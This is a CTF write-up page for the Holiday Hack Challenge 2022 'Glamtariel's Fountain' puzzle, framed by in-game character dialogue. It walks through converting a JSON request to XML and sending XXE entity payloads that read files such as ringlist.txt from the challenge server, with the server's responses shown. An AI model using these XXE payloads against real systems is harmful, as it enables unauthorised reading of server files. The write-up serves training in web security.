
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.5.10">
    
    
      
        <title>3. Glamtariel's Fountain - Holiday Hack Challenge 2022</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.975780f9.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.2505c338.min.css">
        
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="None" data-md-color-accent="None">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#chat-with-fitzy-akbowl" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Holiday Hack Challenge 2022" class="md-header__button md-logo" aria-label="Holiday Hack Challenge 2022" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Holiday Hack Challenge 2022
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              3. Glamtariel's Fountain
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Holiday Hack Challenge 2022" class="md-nav__button md-logo" aria-label="Holiday Hack Challenge 2022" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Holiday Hack Challenge 2022
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        KringleCon 2022
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../0.%20KringleCon%20Orientation/" class="md-nav__link">
        0. KringleCon Orientation
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../6.%20Finale/" class="md-nav__link">
        6. Finale
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4">
          1. Recover the Tolkien Ring
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="1. Recover the Tolkien Ring" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          1. Recover the Tolkien Ring
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Recover%20the%20Tolkien%20Ring/1.%20Wireshark%20Practise/" class="md-nav__link">
        1. Wireshark Practise
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Recover%20the%20Tolkien%20Ring/2.%20Windows%20Event%20Logs/" class="md-nav__link">
        2. Windows Event Logs
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Recover%20the%20Tolkien%20Ring/3.%20Suricata%20Regatta/" class="md-nav__link">
        3. Suricata Regatta
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5">
          2. Recover the Elfen Ring
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="2. Recover the Elfen Ring" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          2. Recover the Elfen Ring
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Recover%20the%20Elfen%20Ring/1.%20Clone%20with%20a%20Difference/" class="md-nav__link">
        1. Clone with a Difference
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Recover%20the%20Elfen%20Ring/2.%20Prison%20Escape/" class="md-nav__link">
        2. Prison Escape
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Recover%20the%20Elfen%20Ring/3.%20Jolly%20CI-CD/" class="md-nav__link">
        3. Jolly CI CD
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_6">
          3. Recover the Web Ring
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="3. Recover the Web Ring" data-md-level="1">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          3. Recover the Web Ring
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../2.%20Open%20Boria%20Mine%20Door/" class="md-nav__link">
        2. Open Boria Mine Door
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          3. Glamtariel's Fountain
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        3. Glamtariel's Fountain
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#chat-with-fitzy-akbowl" class="md-nav__link">
    Chat with Fitzy Akbowl
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#terminal" class="md-nav__link">
    Terminal
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rejoice" class="md-nav__link">
    Rejoice
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#chat-with-grinchum" class="md-nav__link">
    Chat with Grinchum
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_3" type="checkbox" id="__nav_6_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_3">
          1. Boria PCAP Mining
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="1. Boria PCAP Mining" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_3">
          <span class="md-nav__icon md-icon"></span>
          1. Boria PCAP Mining
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../1.%20Boria%20PCAP%20Mining/1.%20Naughty%20IP/" class="md-nav__link">
        1. Naughty IP
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../1.%20Boria%20PCAP%20Mining/2.%20Credential%20Mining/" class="md-nav__link">
        2. Credential Mining
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../1.%20Boria%20PCAP%20Mining/3.%20404%20FTW/" class="md-nav__link">
        3. 404 FTW
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../1.%20Boria%20PCAP%20Mining/4.%20IMDS%2C%20XXE%2C%20and%20Other%20Abbreviations/" class="md-nav__link">
        4. IMDS, XXE, and Other Abbreviations
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7">
          4. Recover the Cloud Ring
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="4. Recover the Cloud Ring" data-md-level="1">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          4. Recover the Cloud Ring
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../4.%20Recover%20the%20Cloud%20Ring/1.%20AWS%20CLI%20Intro/" class="md-nav__link">
        1. AWS CLI Intro
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../4.%20Recover%20the%20Cloud%20Ring/2.%20Trufflehog%20Search/" class="md-nav__link">
        2. Trufflehog Search
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/" class="md-nav__link">
        3. Exploitation via AWS CLI
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8">
          5. Recover the Burning Ring of Fire
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="5. Recover the Burning Ring of Fire" data-md-level="1">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          5. Recover the Burning Ring of Fire
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../5.%20Recover%20the%20Burning%20Ring%20of%20Fire/1.%20Buy%20a%20Hat/" class="md-nav__link">
        1. Buy a Hat
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../5.%20Recover%20the%20Burning%20Ring%20of%20Fire/2.%20Blockchain%20Divination/" class="md-nav__link">
        2. Blockchain Divination
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../5.%20Recover%20the%20Burning%20Ring%20of%20Fire/3.%20Exploit%20a%20Smart%20Contract/" class="md-nav__link">
        3. Exploit a Smart Contract
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#chat-with-fitzy-akbowl" class="md-nav__link">
    Chat with Fitzy Akbowl
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#terminal" class="md-nav__link">
    Terminal
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rejoice" class="md-nav__link">
    Rejoice
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#chat-with-grinchum" class="md-nav__link">
    Chat with Grinchum
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  <h1>3. Glamtariel's Fountain</h1>

<p>Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.</p>
<p>Difficulty: 5/5</p>
<h2 id="chat-with-fitzy-akbowl">Chat with Fitzy Akbowl</h2>
<p>Huh - what? Why do you disturb Akbowl?</p>
<p>I'm trying to get the ring in here for the Sporc Chief.</p>
<p>Unlucky for me it's lost in this water basin thing.</p>
<p>You will not get it out before Akbowl!</p>
<h2 id="terminal">Terminal</h2>
<blockquote>
<p>Discover something Glamtariel has never revealed</p>
<p>What is the filename of the ring she presents you?</p>
</blockquote>
<p>Whenever we drop an object on either the princess or the fountain we see JSON requests getting triggered which look like this:</p>
<pre><code>{&quot;imgDrop&quot;:&quot;img1&quot;,&quot;who&quot;:&quot;princess&quot;,&quot;reqType&quot;:&quot;json&quot;}
</code></pre>
<p>HINT:</p>
<blockquote>
<p>Sometimes we can hit web pages with XXE when they aren't expecting it!</p>
</blockquote>
<p>let's convert the JSON request to an XML request and try sending this modified request.</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;root&gt;
    &lt;imgDrop&gt;img1&lt;/imgDrop&gt;
    &lt;who&gt;princess&lt;/who&gt;
    &lt;reqType&gt;xml&lt;/reqType&gt;
&lt;/root&gt;
</code></pre>
<p>Remember to change the content-type of the request too! On sending this request, we get the following response.</p>
<pre><code>{
  &quot;appResp&quot;: &quot;I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.&quot;,
  &quot;droppedOn&quot;: &quot;none&quot;,
  &quot;visit&quot;: &quot;none&quot;
}
</code></pre>
<p>We know to try XXE from the hint. Also based on the clues from the princess and the fountain we are looking for a ringlist.txt. After experimenting with locations to try XXE as well as guessing possible paths, the following request works and we get a differenct repsonse from the server.</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt; 
&lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/ringlist.txt&quot;&gt; ]&gt;
&lt;root&gt;
 &lt;imgDrop&gt;&amp;xxe;&lt;/imgDrop&gt;
 &lt;who&gt;princess&lt;/who&gt;
 &lt;reqType&gt;xml&lt;/reqType&gt;
&lt;/root&gt;
</code></pre>
<pre><code>{
  &quot;appResp&quot;: &quot;Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)&quot;,
  &quot;droppedOn&quot;: &quot;none&quot;,
  &quot;visit&quot;: &quot;static/images/pholder-morethantopsupersecret63842.png,262px,100px&quot;
}
</code></pre>
<p>The visit parameter in the response points to a URL. Let's visit that.</p>
<pre><code>await fetch(&quot;https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png&quot;, {
    &quot;credentials&quot;: &quot;include&quot;,
    &quot;headers&quot;: {
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot;,
        &quot;Accept&quot;: &quot;image/avif,image/webp,*/*&quot;,
        &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;,
        &quot;Sec-Fetch-Dest&quot;: &quot;image&quot;,
        &quot;Sec-Fetch-Mode&quot;: &quot;no-cors&quot;,
        &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;,
        &quot;Pragma&quot;: &quot;no-cache&quot;,
        &quot;Cache-Control&quot;: &quot;no-cache&quot;
    },
    &quot;referrer&quot;: &quot;https://glamtarielsfountain.com/&quot;,
    &quot;method&quot;: &quot;GET&quot;,
    &quot;mode&quot;: &quot;cors&quot;
});
</code></pre>
<p><img alt="" src="../../images/web_ring/pholder-morethantopsupersecret63842.png" /></p>
<p>The image hints of the existence of a folder called <code>x_phial_pholder_2022</code> within which reside files
<code>bluering.txt</code> and <code>redring.txt</code>. Let's issue requests for these files.</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt; 
&lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/redring.txt&quot;&gt; ]&gt;
&lt;root&gt;
 &lt;imgDrop&gt;&amp;xxe;&lt;/imgDrop&gt;
 &lt;who&gt;princess&lt;/who&gt;
 ```

 ```
 {
  &quot;appResp&quot;: &quot;Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.&quot;,
  &quot;droppedOn&quot;: &quot;none&quot;,
  &quot;visit&quot;: &quot;none&quot;
}
</code></pre>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt; 
&lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/bluering.txt&quot;&gt; ]&gt;
&lt;root&gt;
 &lt;imgDrop&gt;&amp;xxe;&lt;/imgDrop&gt;
 &lt;who&gt;princess&lt;/who&gt;
 &lt;reqType&gt;xml&lt;/reqType&gt;
&lt;/root&gt;
</code></pre>
<pre><code>{
  &quot;appResp&quot;: &quot;I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.&quot;,
  &quot;droppedOn&quot;: &quot;none&quot;,
  &quot;visit&quot;: &quot;none&quot;
}

</code></pre>
<p>Issue a request for silver ring too (just an intuituve guess).</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt; 
&lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/silverring.txt&quot;&gt; ]&gt;
&lt;root&gt;
 &lt;imgDrop&gt;&amp;xxe;&lt;/imgDrop&gt;
 &lt;who&gt;princess&lt;/who&gt;
 &lt;reqType&gt;xml&lt;/reqType&gt;
&lt;/root&gt;
</code></pre>
<pre><code>{
  &quot;appResp&quot;: &quot;I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!&quot;,
  &quot;droppedOn&quot;: &quot;none&quot;,
  &quot;visit&quot;: &quot;static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px&quot;
}
</code></pre>
<p>The visit parameter in the response points to a URL. Let's visit that.</p>
<pre><code>await fetch(&quot;https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px&quot;, {
    &quot;credentials&quot;: &quot;include&quot;,
    &quot;headers&quot;: {
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot;,
        &quot;Accept&quot;: &quot;image/avif,image/webp,*/*&quot;,
        &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;,
        &quot;Sec-Fetch-Dest&quot;: &quot;image&quot;,
        &quot;Sec-Fetch-Mode&quot;: &quot;no-cors&quot;,
        &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;,
        &quot;Pragma&quot;: &quot;no-cache&quot;,
        &quot;Cache-Control&quot;: &quot;no-cache&quot;
    },
    &quot;referrer&quot;: &quot;https://glamtarielsfountain.com/&quot;,
    &quot;method&quot;: &quot;GET&quot;,
    &quot;mode&quot;: &quot;cors&quot;
});
</code></pre>
<p><img alt="" src="../../images/web_ring/redring-supersupersecret928164.png" /></p>
<p>On closer inspection we find that the writing on the ring says <code>goldring_to_be_deleted.txt</code>. Let's issue a request for this file.</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt; 
&lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt&quot;&gt; ]&gt;
&lt;root&gt;
 &lt;imgDrop&gt;&amp;xxe;&lt;/imgDrop&gt;
 &lt;who&gt;princess&lt;/who&gt;
 &lt;reqType&gt;xml&lt;/reqType&gt;
&lt;/root&gt;
</code></pre>
<pre><code>{
  &quot;appResp&quot;: &quot;Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.&quot;,
  &quot;droppedOn&quot;: &quot;none&quot;,
  &quot;visit&quot;: &quot;none&quot;
}
</code></pre>
<p>based on the REQYPE hint above, let's change the postion of the XXE to the reqtype element. Also let's drop the silver ring (img1).</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt; 
&lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt&quot;&gt; ]&gt;
&lt;root&gt;
 &lt;imgDrop&gt;img1&lt;/imgDrop&gt;
 &lt;who&gt;princess&lt;/who&gt;
 &lt;reqType&gt;&amp;xxe;&lt;/reqType&gt;
&lt;/root&gt;
</code></pre>
<pre><code>{
  &quot;appResp&quot;: &quot;No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!&quot;,
  &quot;droppedOn&quot;: &quot;none&quot;,
  &quot;visit&quot;: &quot;static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px&quot;
}

Issue a request to the URL in the visit parameter of the response to get the ring!

</code></pre>
<p><img alt="" src="../../images/web_ring/goldring-morethansupertopsecret76394734.png" /></p>
<h2 id="rejoice">Rejoice</h2>
<p>No! That's not yours!</p>
<p>This birdbath showed me images of this happening.</p>
<p>But I didn't believe it because nobody is better than Akbowl!</p>
<p>Akbowl's head is the hardest! That's what the other sporcs tell me.</p>
<p>I guess Akbowl's head is not the smartest.</p>
<h2 id="chat-with-grinchum">Chat with Grinchum</h2>
<p>😏 First lost... second lost... third lost. 😟</p>
<p>Where are they? 😦 WHERE ARE THEY, preciouses?</p>
<p>No! Aaargh! Lost!</p>
<p>😖 You - naggy human. Musn't bother us. 😱 Not its business! grinchum..grinchum</p>





                
              </article>
            </div>
          
          
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    
    <nav class="md-footer__inner md-grid" aria-label="Footer" >
      
        
        <a href="../2.%20Open%20Boria%20Mine%20Door/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 2. Open Boria Mine Door" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              2. Open Boria Mine Door
            </div>
          </div>
        </a>
      
      
        
        <a href="../1.%20Boria%20PCAP%20Mining/1.%20Naughty%20IP/" class="md-footer__link md-footer__link--next" aria-label="Next: 1. Naughty IP" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              1. Naughty IP
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.16e2a7d4.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.5a2dcb6a.min.js"></script>
      
    
    
  </body>
</html>